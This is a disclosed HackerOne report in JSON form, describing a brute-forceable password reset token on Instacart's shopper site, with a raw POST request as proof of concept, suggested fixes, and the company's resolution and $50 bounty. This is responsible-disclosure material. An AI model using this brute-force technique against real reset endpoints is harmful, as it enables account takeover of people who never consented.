{"id":271533,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzE1MzM=","url":"https://hackerone.com/reports/271533","title":"Bruteforcing password reset tokens, could lead to account takeover","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-09-25T14:43:49.014Z","submitted_at":"2017-09-25T14:43:49.014Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"003random","url":"/003random","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/133/854/e8fd5bb87f95ef047fea6d5c26fdcd7c0c396697_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":555,"url":"https://hackerone.com/instacart","handle":"instacart","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/555/df662b77c791ed1296275d032f446300e1a5a6b3_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/555/df662b77c791ed1296275d032f446300e1a5a6b3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Instacart","twitter_handle":"instacart","website":"https://www.instacart.com/","about":"Same-day grocery delivery"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-11-06T22:34:36.314Z","bug_reporter_agreed_on_going_public_at":"2017-11-01T23:53:27.848Z","team_member_agreed_on_going_public_at":"2017-11-06T22:34:36.036Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hey Instacart security team,\n\n###Description\nWhen resetting a new password on https://shoppers.instacart.com/password you will receive an email with a reset link.\nwhen clicking on this link. you go to this page: https://shoppers.instacart.com/password/edit?reset_password_token=Your_Token\n\nwhen entering a new password in the 2 input boxes on the page and clicking on \"change my password\" a post will be send to https://shoppers.instacart.com/password.\nif the token is correct, the password will be changed. but if the token is incorrect, the response will contain \"Reset password token is invalid\".\n\nBecause there is no rate limit in place, this token can easily be brute forced.\n\n###poc\nthis is the request that is used: \n\nPOST /password HTTP/1.1\nHost: shoppers.instacart.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 274\nReferer: https://shoppers.instacart.com/password/edit?reset_password_token=The_Reset_Token\nCookie: My_cookies\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nutf8=%E2%9C%93\u0026_method=put\u0026authenticity_token=fSk65PV8vJ0RddbWWQsRP5VrbNIVqHjT%2Fgx6b8BlrOKIQirOlPSZ%2BnnbPUtPR8dB3hkMTLcky0J0P01qoysScQ%3D%3D\u0026driver%5Breset_password_token%5D=The_Reset_Token\u0026driver%5Bpassword%5D=New_password\u0026driver%5Bpassword_confirmation%5D=New_password\u0026commit=Change+my+password\n\n###fix\nto fix this issue, you could implement an timeout after a number of requests in a period of time.\njust like it is implemented here: https://www.instacart.com/accounts/password\nthis returns \"429 Too Many Requests\" when making multiple requests in a short period of time.\n\nalso making the token more random by giving it a random number of characters instead of 20 characters will also help.\nthere is also an option to include the email as parameter. \n\nIf you have questions, please don't hesitate to ask them. i will be happy to answer them ;)\n\n\n\n","vulnerability_information_html":"\u003cp\u003eHey Instacart security team,\u003c/p\u003e\n\n\u003ch3 id=\"description\"\u003eDescription\u003c/h3\u003e\n\n\u003cp\u003eWhen resetting a new password on \u003ca title=\"https://shoppers.instacart.com/password\" href=\"/redirect?url=https%3A%2F%2Fshoppers.instacart.com%2Fpassword\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://shoppers.instacart.com/password\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e you will receive an email with a reset link.\u003cbr\u003e\nwhen clicking on this link. you go to this page: \u003ca title=\"https://shoppers.instacart.com/password/edit?reset_password_token=Your_Token\" href=\"/redirect?url=https%3A%2F%2Fshoppers.instacart.com%2Fpassword%2Fedit%3Freset_password_token%3DYour_Token\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://shoppers.instacart.com/password/edit?reset_password_token=Your_Token\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003ewhen entering a new password in the 2 input boxes on the page and clicking on \u0026quot;change my password\u0026quot; a post will be send to \u003ca title=\"https://shoppers.instacart.com/password\" href=\"/redirect?url=https%3A%2F%2Fshoppers.instacart.com%2Fpassword\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://shoppers.instacart.com/password\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nif the token is correct, the password will be changed. but if the token is incorrect, the response will contain \u0026quot;Reset password token is invalid\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eBecause there is no rate limit in place, this token can easily be brute forced.\u003c/p\u003e\n\n\u003ch3 id=\"poc\"\u003epoc\u003c/h3\u003e\n\n\u003cp\u003ethis is the request that is used: \u003c/p\u003e\n\n\u003cp\u003ePOST /password HTTP/1.1\u003cbr\u003e\nHost: shoppers.instacart.com\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0\u003cbr\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,\u003cem\u003e/\u003c/em\u003e;q=0.8\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nContent-Type: application/x-www-form-urlencoded\u003cbr\u003e\nContent-Length: 274\u003cbr\u003e\nReferer: \u003ca title=\"https://shoppers.instacart.com/password/edit?reset_password_token=The_Reset_Token\" href=\"/redirect?url=https%3A%2F%2Fshoppers.instacart.com%2Fpassword%2Fedit%3Freset_password_token%3DThe_Reset_Token\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://shoppers.instacart.com/password/edit?reset_password_token=The_Reset_Token\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nCookie: My_cookies\u003cbr\u003e\nDNT: 1\u003cbr\u003e\nConnection: close\u003cbr\u003e\nUpgrade-Insecure-Requests: 1\u003c/p\u003e\n\n\u003cp\u003eutf8=%E2%9C%93\u0026amp;_method=put\u0026amp;authenticity_token=fSk65PV8vJ0RddbWWQsRP5VrbNIVqHjT%2Fgx6b8BlrOKIQirOlPSZ%2BnnbPUtPR8dB3hkMTLcky0J0P01qoysScQ%3D%3D\u0026amp;driver%5Breset_password_token%5D=The_Reset_Token\u0026amp;driver%5Bpassword%5D=New_password\u0026amp;driver%5Bpassword_confirmation%5D=New_password\u0026amp;commit=Change+my+password\u003c/p\u003e\n\n\u003ch3 id=\"fix\"\u003efix\u003c/h3\u003e\n\n\u003cp\u003eto fix this issue, you could implement an timeout after a number of requests in a period of time.\u003cbr\u003e\njust like it is implemented here: \u003ca title=\"https://www.instacart.com/accounts/password\" href=\"/redirect?url=https%3A%2F%2Fwww.instacart.com%2Faccounts%2Fpassword\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.instacart.com/accounts/password\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nthis returns \u0026quot;429 Too Many Requests\u0026quot; when making multiple requests in a short period of time.\u003c/p\u003e\n\n\u003cp\u003ealso making the token more random by giving it a random number of characters instead of 20 characters will also help.\u003cbr\u003e\nthere is also an option to include the email as parameter. \u003c/p\u003e\n\n\u003cp\u003eIf you have questions, please don\u0026#39;t hesitate to ask them. i will be happy to answer them ;)\u003c/p\u003e\n","bounty_amount":"50.0","formatted_bounty":"$50","weakness":{"id":31,"name":"Brute Force"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-12-01T23:53:27.967Z","allow_singular_disclosure_after":-97046746.7810617,"singular_disclosure_allowed":true,"vote_count":7,"voters":["eveeez","r3y","ahsan","japz","clarckowen_","karma_coded","b4155f7c29acd42c27d007a"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2022094,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"we are investigating this as well -- thank you again for your reports.","markdown_message":"\u003cp\u003ewe are investigating this as well -- thank you again for your reports.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-25T18:45:19.890Z","updated_at":"2017-09-25T18:45:19.890Z","actor":{"username":"nickelser","cleared":false,"url":"/nickelser","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/597/6eed3c3779f9a12dd76d5c4f6c636ba946d611d3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2023198,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Should be fixed now, thanks!","markdown_message":"\u003cp\u003eShould be fixed now, thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-25T22:46:58.741Z","updated_at":"2017-09-25T22:46:58.741Z","actor":{"url":"/instacart","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/555/df662b77c791ed1296275d032f446300e1a5a6b3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Instacart"}},"bounty_amount":"50.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"instacart","collaborator":{"username":"003random","url":"/003random"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2023199,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-25T22:47:11.464Z","updated_at":"2017-09-25T22:47:11.464Z","actor":{"username":"rahilsondhi","cleared":false,"url":"/rahilsondhi","profile_picture_urls":{"medium":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBbUExIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--e85fd30aa1823183d04ad407ac18359597a4820b/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9VWTI5dFltbHVaVjl2Y0hScGIyNXpld2c2REdkeVlYWnBkSGxKSWd0RFpXNTBaWElHT2daRlZEb0xjbVZ6YVhwbFNTSUxPREo0T0RKZUJqc0hWRG9KWTNKdmNFa2lEamd5ZURneUt6QXJNQVk3QjFRPSIsImV4cCI6bnVsbCwicHVyIjoidmFyaWF0aW9uIn19--0e71f6791faebe1c35f4452bd21d67fb6decfbc2/dp3_500x500.jpg"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"003random","url":"/003random"},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2023217,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"wow, thanks for incredible fast response and action, and the bounty :)","markdown_message":"\u003cp\u003ewow, thanks for incredible fast response and action, and the bounty :)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-25T23:03:08.454Z","updated_at":"2017-09-25T23:03:08.454Z","actor":{"username":"003random","cleared":false,"url":"/003random","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/133/854/e8fd5bb87f95ef047fea6d5c26fdcd7c0c396697_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2123279,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Shall we? :)","markdown_message":"\u003cp\u003eShall we? :)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-01T23:53:27.889Z","updated_at":"2017-11-01T23:53:27.889Z","first_to_agree":true,"actor":{"username":"003random","cleared":false,"url":"/003random","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/133/854/e8fd5bb87f95ef047fea6d5c26fdcd7c0c396697_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2138464,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-06T22:34:36.160Z","updated_at":"2017-11-06T22:34:36.160Z","actor":{"username":"rahilsondhi","cleared":false,"url":"/rahilsondhi","profile_picture_urls":{"medium":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBbUExIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--e85fd30aa1823183d04ad407ac18359597a4820b/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9VWTI5dFltbHVaVjl2Y0hScGIyNXpld2c2REdkeVlYWnBkSGxKSWd0RFpXNTBaWElHT2daRlZEb0xjbVZ6YVhwbFNTSUxPREo0T0RKZUJqc0hWRG9KWTNKdmNFa2lEamd5ZURneUt6QXJNQVk3QjFRPSIsImV4cCI6bnVsbCwicHVyIjoidmFyaWF0aW9uIn19--0e71f6791faebe1c35f4452bd21d67fb6decfbc2/dp3_500x500.jpg"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2138465,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-06T22:34:36.398Z","updated_at":"2017-11-06T22:34:36.398Z","actor":{"username":"rahilsondhi","cleared":false,"url":"/rahilsondhi","profile_picture_urls":{"medium":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBbUExIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--e85fd30aa1823183d04ad407ac18359597a4820b/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9VWTI5dFltbHVaVjl2Y0hScGIyNXpld2c2REdkeVlYWnBkSGxKSWd0RFpXNTBaWElHT2daRlZEb0xjbVZ6YVhwbFNTSUxPREo0T0RKZUJqc0hWRG9KWTNKdmNFa2lEamd5ZURneUt6QXJNQVk3QjFRPSIsImV4cCI6bnVsbCwicHVyIjoidmFyaWF0aW9uIn19--0e71f6791faebe1c35f4452bd21d67fb6decfbc2/dp3_500x500.jpg"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}